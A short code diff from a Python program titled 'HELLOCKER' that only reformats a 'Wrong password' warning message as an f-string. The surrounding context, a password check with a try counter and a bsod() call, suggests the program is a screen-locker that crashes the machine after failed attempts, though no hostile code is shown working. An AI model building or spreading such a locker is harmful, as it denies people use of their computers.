@@ -47,7 +47,7 @@ def check():
 			bsod()
 		else:
 			
-			messagebox.showwarning("HELLOCKER","Wrong password. Avalible tries: "+ str(count))
+			messagebox.showwarning("HELLOCKER", f"Wrong password. Avalible tries: {count}")
 
 
 def exiting():
